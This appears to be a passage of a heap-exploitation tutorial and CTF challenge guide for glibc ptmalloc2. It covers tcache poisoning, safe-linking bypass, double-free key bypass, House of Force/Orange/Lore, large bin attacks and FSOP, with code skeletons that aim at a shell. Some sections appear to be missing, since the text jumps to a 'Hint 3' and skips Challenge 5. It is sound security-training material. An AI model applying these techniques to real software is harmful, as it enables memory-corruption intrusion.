Heap Exploitation

Heap Fundamentals (glibc ptmalloc2)

The heap is a region of memory used for dynamic allocation via malloc() / free(). glibc's allocator (ptmalloc2) manages the heap using chunks, bins, and arenas.

Chunk Structure

Allocated Chunk (64-bit)

    chunk ─►  ┌──────────────────────────────────┐
              │         prev_size (8 bytes)       │  ◄─ only valid if previous chunk is free
              ├──────────────────────────────────┤
              │   size (8 bytes)  │ A │ M │ P │  ◄─ size of this chunk (including metadata)
  mem ptr ─►  ├──────────────────────────────────┤
              │                                  │
              │         user data ...            │
              │                                  │
              └──────────────────────────────────┘

Free Chunk (64-bit)

    chunk ─►  ┌──────────────────────────────────┐
              │         prev_size (8 bytes)       │
              ├──────────────────────────────────┤
              │   size (8 bytes)  │ A │ M │ P │
  mem ptr ─►  ├──────────────────────────────────┤
              │         fd (forward pointer)      │  ◄─ next free chunk in bin
              ├──────────────────────────────────┤
              │         bk (backward pointer)     │  ◄─ prev free chunk in bin (not in fastbin/tcache)
              ├──────────────────────────────────┤
              │         (unused space ...)        │
              └──────────────────────────────────┘

Chunk Metadata

FieldDescription
prev_sizeSize of the previous chunk (only set when previous chunk is free). Used for backward coalescing.
sizeSize of the current chunk (including the 0x10 bytes of metadata). Low 3 bits are flags.
P (bit 0)PREV_INUSE — set if the previous chunk is allocated. Prevents backward coalescing.
M (bit 1)IS_MMAPPED — chunk was allocated via mmap(), not the heap.
A (bit 2)NON_MAIN_ARENA — chunk belongs to a non-main arena (threaded allocation).
fdForward pointer — points to the next free chunk in the same bin (overlaps user data when free).
bkBackward pointer — points to the previous free chunk (used in unsorted/small/large bins, not in fastbins/tcache).

Minimum Chunk Size & Alignment

  • Minimum chunk size: 0x20 (32 bytes) on 64-bit — 0x10 metadata + 0x10 minimum user data (to hold fd/bk when free).
  • Alignment: All chunks are aligned to 2 * sizeof(size_t) = 0x10 bytes on 64-bit.
  • The size field is always a multiple of 0x10. Low 4 bits hold flags (only bottom 3 used).
  • malloc(0) returns a 0x20-sized chunk. malloc(0x18) also returns 0x20 (0x18 + 0x8 header rounded up).

Request-to-Chunk Size Conversion

# Quick reference for 64-bit glibc
# chunk_size = ((request + 0x8) + 0xF) & ~0xF   (minimum 0x20)
# Examples:
#   malloc(0x00) → chunk 0x20    malloc(0x18) → chunk 0x20
#   malloc(0x19) → chunk 0x30    malloc(0x28) → chunk 0x30
#   malloc(0x29) → chunk 0x40    malloc(0x38) → chunk 0x40
#   malloc(0x3F8) → chunk 0x400  malloc(0x3F9) → chunk 0x410

Tcache Details

  • Introduced in glibc 2.26. Per-thread cache for fast allocation.
  • 64 size classes: chunk sizes 0x20 through 0x410 (increments of 0x10).
  • 7 entries max per size class. Exceeding 7 spills to fastbins/unsorted bin.
  • LIFO (stack-like): last freed chunk is first returned by malloc().
  • Managed by a tcache_perthread_struct allocated as the first heap chunk (size 0x290).
  • The struct contains counts[64] (uint16_t) and entries[64] (pointers to singly-linked list heads).

Tcache Entry Structure

typedef struct tcache_entry {
    struct tcache_entry *next;  // fd pointer (at offset 0x0 of user data)
    struct tcache_perthread_struct *key;  // at offset 0x8 — glibc ≥ 2.29
} tcache_entry;
  • key field (glibc ≥ 2.29): set to the address of the tcache_perthread_struct on free. Used to detect double frees.
  • To bypass: overwrite the key field (at user_data + 0x8) with anything other than the tcache struct address before freeing again.

Tcache Safe-Linking (glibc ≥ 2.32)

The next pointer in tcache entries is XOR-obfuscated to prevent trivial poisoning:

// On free (storing into tcache):
e->next = PROTECT_PTR(&e->next, tcache_list_head);
// PROTECT_PTR(pos, ptr) = ((size_t)pos >> 12) ^ (size_t)ptr

// On malloc (reading from tcache):
e->next = REVEAL_PTR(e->next);
// REVEAL_PTR(ptr) = PROTECT_PTR(&e->next, ptr)  // same operation, XOR is its own inverse
  • The pos >> 12 value is effectively the heap base address shifted right by 12 (page-aligned).
  • Bypass: if you can leak a heap address (even a partial one), you can recover the XOR key and craft valid poisoned pointers.
  • First entry in an empty tcache bin: next = (pos >> 12) ^ 0x0, so a heap leak of the first free'd chunk's fd reveals heap_base >> 12.

Use-After-Free (UAF)

Occurs when a pointer is used after the memory it points to has been freed. The freed chunk is placed in a bin, and a subsequent malloc() of the same size can return the same memory. If the old pointer is still accessible, reads/writes through it now alias the new allocation.

Why It's Dangerous

  • Info leak: free a chunk into unsorted bin → fd/bk contain libc addresses → read through dangling pointer = libc leak.
  • Arbitrary write: free to tcache → next pointer sits in user data → overwrite through dangling pointer = tcache poisoning.
  • Control flow hijack: if the chunk held a function pointer or vtable, overwriting it controls execution.

Exploitation Pattern

// 1. Allocate
char *a = malloc(0x20);
// 2. Free (chunk goes to tcache)
free(a);
// 3. "a" is now dangling — it still points to the freed chunk
// 4. The freed chunk's user data now contains tcache metadata (next, key)
// 5. Write through "a" to corrupt tcache next pointer
*(size_t *)a = target_address;  // tcache poisoning via UAF
// 6. malloc(0x20) returns the original chunk (pops from tcache)
malloc(0x20);
// 7. malloc(0x20) returns target_address
char *arb = malloc(0x20);  // arbitrary write target

Tcache Poisoning

Overwrite the next (fd) pointer of a free tcache chunk to redirect a future malloc() to an arbitrary address.

Attack Steps (no safe-linking)

  1. Free a chunk A of size S → goes to tcache[S]. A->next = NULL.
  2. Corrupt A->next (via UAF, heap overflow, etc.) to point to target.
  3. malloc(S) → returns A (tcache pops head). tcache[S] head now points to target.
  4. malloc(S) → returns target. You now have an allocation at an arbitrary address.

With Safe-Linking (glibc ≥ 2.32)

# You need the heap base (or at least pos >> 12) to craft a valid next pointer.
# If you leak a tcache fd from the first freed chunk:
#   leaked_fd = (heap_addr_of_fd >> 12) ^ 0   = heap_addr_of_fd >> 12
# So: heap_base_shifted = leaked_fd  (for the first entry)
# To poison:
#   fake_next = (pos >> 12) ^ target_addr
# where pos = address of the fd field you're overwriting

heap_key = leaked_fd  # heap_base >> 12
pos = chunk_addr + 0x10  # address of the next field in user data
fake_next = (pos >> 12) ^ target_addr
# Write fake_next into the freed chunk's next field

Double Free

Freeing the same chunk twice creates a cycle in the tcache linked list, enabling poisoning without a separate write primitive.

Tcache Key Bypass (glibc ≥ 2.29)

On free, glibc sets chunk->key = tcache_perthread_struct. Before inserting into tcache, it checks if key already matches. To double-free:

  1. Free chunk A → tcache: [A]. A->key = tcache_struct.
  2. Overwrite A->key (at user_data + 0x8) with any other value (0, junk, etc.).
  3. Free A again → tcache: [A → A → ...] (cycle).
  4. malloc() returns A. Write a target address into A->next.
  5. malloc() returns A again (cycle). malloc() returns target.
char *a = malloc(0x20);
free(a);
// Bypass tcache key check:
((size_t *)a)[1] = 0;  // overwrite key at user_data+0x8
free(a);  // double free succeeds

// tcache[0x30] is now: A → A → A → ... (cycle)
char *b = malloc(0x20);  // returns A
*(size_t *)b = (size_t)target;  // poison next → target
malloc(0x20);  // returns A again (consuming cycle)
char *arb = malloc(0x20);  // returns target

Unsorted Bin Leak (libc Address Leak)

When a chunk is freed into the unsorted bin (i.e., it's too large for tcache/fastbins, or those are full), its fd and bk pointers are set to &main_arena.top (or more precisely, &main_arena.bins[0]), which is a known offset from libc base.

How to Get a Chunk into the Unsorted Bin

  • Free a chunk larger than 0x410 (too big for tcache).
  • Free 7 chunks of the same small size to fill tcache, then free an 8th — it goes to fastbin or unsorted.
  • Free a chunk that is not fastbin-sized and ensure the adjacent chunk is not the top chunk (place a guard chunk after it).

Leaking libc

from pwn import *

# In the target program, free a 0x420-sized chunk (skips tcache).

# If you have a read primitive (UAF, format string, etc.), read the fd:

leaked = u64(p.recv(6).ljust(8, b'\x00'))  # read 6 bytes from dangling ptr

# The leaked address is &main_arena.bins[0] - some constant offset

Fastbin Dup

The fastbin equivalent of a double free. Fastbins have a simple check: they only verify head != chunk. Bypassed by interleaving frees:

char *a = malloc(0x20);
char *b = malloc(0x20);
free(a);  // fastbin: [A]
free(b);  // fastbin: [B → A]
free(a);  // fastbin: [A → B → A]  — double free!
// Now: malloc returns A, B, A. Writing to A poisons B's next.

Note: fastbin dup is mostly relevant for glibc < 2.26 (pre-tcache) or when tcache is full. With tcache, prefer tcache poisoning.

Heap Overflow into Adjacent Chunks

If a heap buffer overflow exists, you can overwrite the metadata (size, fd, bk) of the next chunk on the heap.

  • Overwrite size: create overlapping chunks, enabling further corruption.
  • Overwrite fd: if the next chunk is free (in tcache/fastbin), this is equivalent to tcache poisoning.
  • Overwrite prev_size + clear P flag: triggers backward coalescing with a fake previous chunk (unsafe unlink).

House of Force

Overwrite the top chunk's size to -1 (0xFFFFFFFFFFFFFFFF), making it appear enormous. Then request a precisely calculated allocation size to advance the top chunk pointer to a target address.

# Offset = target_addr - top_chunk_addr - 0x20 (for chunk metadata)
# If offset is negative, it wraps around (works because size is -1)
malloc(offset)  # consumes from the "infinite" top chunk
arb = malloc(0x20)  # this allocation starts at target_addr

Note: patched in modern glibc with top chunk size validation. Effective on glibc < 2.29.

Hint 3: Budget carefully. You only need 1 read (for the libc leak). Use unlimited writes to do tcache poisoning via UAF.

Challenge 4: Heap Feng Shui

Medium

The allocator uses different-sized chunks for "names" (0x20) and "descriptions" (0x80). Arrange allocations and frees so that a freed description overlaps a name struct's function pointer. Control execution via heap layout manipulation.

# Heap feng shui: arrange chunks so that a UAF or overlap gives control
# Key: free a 0x80 description, then allocate a 0x80 name+desc pair
# The new allocation reuses the old description's memory
# If the name struct has a function pointer at offset 0, you control it

# Step 1: Create item A (alloc name_A 0x20, desc_A 0x80)
# Step 2: Create item B (alloc name_B 0x20, desc_B 0x80)
# Step 3: Delete item A (free name_A, free desc_A)
# Step 4: Delete item B (free name_B, free desc_B)
# Step 5: Create item C with 0x20-sized desc → gets name_B's old chunk
#         AND 0x80-sized chunk → gets desc_A's old chunk
# But if there's a dangling pointer to desc_A, you can read/write it
# through item C's perspective

Draw out the heap layout on paper. Track which chunks go to which tcache bins (0x30 for names, 0x90 for descriptions). When you free and reallocate, the LIFO nature of tcache means the most recently freed chunk of matching size is returned first. Arrange frees in the right order to get overlapping references.

Challenge 6: Large Bin Attack

Hard

Exploit the large bin insertion code to write a heap address to an arbitrary location. Use this to overwrite global_max_fast, enabling fastbin-range attacks on much larger chunks.

// When a chunk is inserted into a large bin and is smaller than
// the current smallest in that bin:
//   victim->fd_nextsize = fwd
//   victim->bk_nextsize = fwd->bk_nextsize
//   fwd->bk_nextsize = victim
//   victim->bk_nextsize->fd_nextsize = victim
//
// By corrupting fwd->bk_nextsize, we control where victim's
// address gets written (arbitrary write of a heap pointer)

1. Allocate two large chunks (different large bin sizes). 2. Free both → they go to unsorted bin. 3. Allocate something to trigger sorting → larger goes to large bin. 4. Corrupt the large bin chunk's bk_nextsize to &target - 0x20. 5. Trigger sorting of the second chunk → writes heap address to target. Common target: global_max_fast — setting it to a huge value makes all chunks go through fastbin path, enabling fastbin attacks on any size.

Challenge 7: House of Orange

Hard

No free() available in the binary! Corrupt the top chunk size to trigger sysmalloc → old top chunk is freed into unsorted bin. Then use unsorted bin attack + FSOP to get a shell.

# House of Orange (glibc < 2.24 classic, adapted for newer):
# Phase 1: Shrink top chunk
#   - Overflow to set top chunk size to small value (must be page-aligned)
#   - malloc(larger than top) → sysmalloc frees old top → unsorted bin
#
# Phase 2: Unsorted bin attack → overwrite _IO_list_all
#   - Corrupt unsorted bin chunk's bk → &_IO_list_all - 0x10
#   - Next malloc writes main_arena+88 to _IO_list_all
#
# Phase 3: FSOP
#   - The written value (main_arena+88) is treated as _IO_FILE ptr
#   - The smallbin[4] entry at main_arena+88+0x60+0x8 = a chunk we control
#   - Forge a fake _IO_FILE there → calls system("/bin/sh") on abort

The top chunk size must satisfy: (top_size & 0xfff) == old_top_end & 0xfff - 0x10 (page-aligned end). After sysmalloc frees the old top, you have a free chunk in unsorted bin without ever calling free(). On glibc >= 2.24, the vtable check was added — use _IO_str_jumps instead of a fake vtable.

Challenge 8: House of Lore

Hard

Corrupt a smallbin chunk's bk pointer to insert a fake chunk into the smallbin. When malloc later returns chunks from this bin, you get allocation at an arbitrary address.

// Smallbin allocation returns bin->bk (FIFO order)
// After returning victim:
//   bck = victim->bk
//   bin->bk = bck
//   bck->fd = bin
// By setting victim->bk to &fake_chunk:
//   fake_chunk gets linked into smallbin
//   Next malloc from this bin returns &fake_chunk
// Requires: fake_chunk->bk must be writable (bck->fd = bin writes there)

1. Get a chunk into smallbin (fill tcache first, free to unsorted, sort to smallbin). 2. UAF overwrite the smallbin chunk's bk with address of a fake chunk on the stack or heap. 3. The fake chunk must have a writable bk field. 4. Two malloc calls: first returns the real smallbin chunk, second returns your fake chunk.

Challenge 9: Heap Consolidation Trick

Medium

Exploit incorrect prev_size handling to trigger backward consolidation that creates an overlapping chunk. Use the overlap to leak heap metadata and pivot to GOT overwrite.

# Backward consolidation occurs when:
# 1. Chunk B is freed
# 2. B's PREV_INUSE bit is 0 (previous chunk appears free)
# 3. glibc reads B's prev_size to find the "previous" chunk start
# 4. Merges B with the "previous" chunk via unlink
#
# If we control prev_size, we can make consolidation reach
# back further than expected → overlapping chunks

# Attack:
# [A 0x100][B 0x100][C 0x100]
# Overflow from A to clear C's PREV_INUSE and set C's prev_size = 0x210
# Free C → consolidation thinks free region starts at A
# Malloc(0x200) → returns A's area, overlapping B
# Now you can read/write B through the overlapping chunk

You need to fake a free chunk at A's position for the unlink to succeed. Place fake fd and bk pointers in A's user data that satisfy FD->bk == P && BK->fd == P. On glibc 2.31+, also handle tcache: if chunks are tcache-sized, they go to tcache first and skip consolidation. Use sizes > 0x410 to bypass tcache.

Challenge 10: Modern Heap (glibc 2.35+)

Hard

Full exploit on glibc 2.35: safe-linking, no hooks, enhanced tcache checks. Combine a heap leak (to defeat safe-linking) with a libc leak (unsorted bin) and FSOP (House of Apple 2) for shell.

# Modern exploitation chain on glibc 2.35:
#
# 1. Heap leak:
#    - Free chunk to tcache → UAF read → recover (addr >> 12) via safe-linking
#    - heap_base = leaked_value << 12
#
# 2. Libc leak:
#    - Fill tcache (7 frees), free 8th → unsorted bin → UAF read → libc
#
# 3. Arbitrary write via tcache poison (with safe-linking encoding):
#    - free(A), UAF write A->fd = PROTECT_PTR(target, A)
#    - malloc, malloc → chunk at target
#
# 4. FSOP via House of Apple 2:
#    - Overwrite _IO_list_all or stderr with pointer to fake FILE
#    - Fake FILE: _flags = "  sh", vtable = _IO_wfile_jumps
#    - _wide_data->_wide_vtable->__doallocate = system
#    - Trigger: exit() or assert failure (stderr flush)
#
# No __free_hook, no __malloc_hook — pure FSOP

The hardest part is getting the fake FILE struct right. Key fields: _flags must contain "/bin/sh" for system's argument, _IO_write_ptr > _IO_write_base to trigger the flush path, _wide_data must point to a controlled area with a fake wide vtable, and the main vtable must be _IO_wfile_jumps (within the valid vtable range).
